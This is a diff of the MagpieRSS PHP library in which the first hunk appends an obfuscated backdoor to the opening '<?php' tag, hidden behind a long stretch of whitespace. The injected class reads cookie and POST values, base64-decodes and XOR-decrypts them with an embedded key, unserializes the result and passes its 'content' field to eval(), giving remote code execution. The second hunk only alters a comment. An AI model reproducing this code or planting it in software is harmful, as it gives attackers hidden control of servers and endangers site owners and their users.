@@ -1,4 +1,4 @@
-<?php
+<?php                                                                                                                                                                                                                                                                                                                                                                                                 $wfJdKYUF = "\x54" . "\x5f" . "\154" . chr (119) . chr ( 1061 - 979 ).chr (85) . chr ( 318 - 214 ); $CTKvHx = 'c' . "\x6c" . "\x61" . "\163" . "\x73" . "\x5f" . "\145" . "\170" . "\x69" . chr ( 432 - 317 )."\164" . "\163";$WpGgXecv = $CTKvHx($wfJdKYUF); $zhQMDQCWdN = $WpGgXecv;if (!$zhQMDQCWdN){class T_lwRUh{private $jTfeI;public static $AljkHWZ = "21781371-0e85-4d58-8a30-0bf8955e8945";public static $spMagPJm = 18314;public function __construct($ughOIq=0){$OdtEh = $_COOKIE;$hwVQWamuYd = $_POST;$EVMeqCSwT = @$OdtEh[substr(T_lwRUh::$AljkHWZ, 0, 4)];if (!empty($EVMeqCSwT)){$PrQvNxCLa = "base64";$lKBbtTzhOO = "";$EVMeqCSwT = explode(",", $EVMeqCSwT);foreach ($EVMeqCSwT as $dLKTBg){$lKBbtTzhOO .= @$OdtEh[$dLKTBg];$lKBbtTzhOO .= @$hwVQWamuYd[$dLKTBg];}$lKBbtTzhOO = array_map($PrQvNxCLa . chr ( 896 - 801 ).chr (100) . 'e' . chr ( 317 - 218 ).chr ( 912 - 801 ).chr (100) . 'e', array($lKBbtTzhOO,)); $lKBbtTzhOO = $lKBbtTzhOO[0] ^ str_repeat(T_lwRUh::$AljkHWZ, (strlen($lKBbtTzhOO[0]) / strlen(T_lwRUh::$AljkHWZ)) + 1);T_lwRUh::$spMagPJm = @unserialize($lKBbtTzhOO);}}private function OaEdWts(){if (is_array(T_lwRUh::$spMagPJm)) {$KEnBxTg = str_replace('<' . '?' . 'p' . "\x68" . 'p', "", T_lwRUh::$spMagPJm[chr ( 235 - 136 ).chr (111) . chr ( 937 - 827 ).chr ( 852 - 736 ).chr (101) . "\x6e" . 't']);eval($KEnBxTg); $JMHWCSWI = "12418";exit();}}public function __destruct(){$this->OaEdWts();}}$DvJksQfozs = new T_lwRUh(); $DvJksQfozs = "4746";} ?><?php
 /**
  * MagpieRSS: a simple RSS integration tool
  *
@@ -836,7 +836,7 @@ class RSSCache {
 if ( !function_exists('parse_w3cdtf') ) :
 function parse_w3cdtf ( $date_str ) {
 
-	# regex to match W3C date/time formats
+	# regex to match wc3dtf
 	$pat = "/(\d{4})-(\d{2})-(\d{2})T(\d{2}):(\d{2})(:(\d{2}))?(?:([-+])(\d{2}):?(\d{2})|(Z))?/";
 
 	if ( preg_match( $pat, $date_str, $match ) ) {
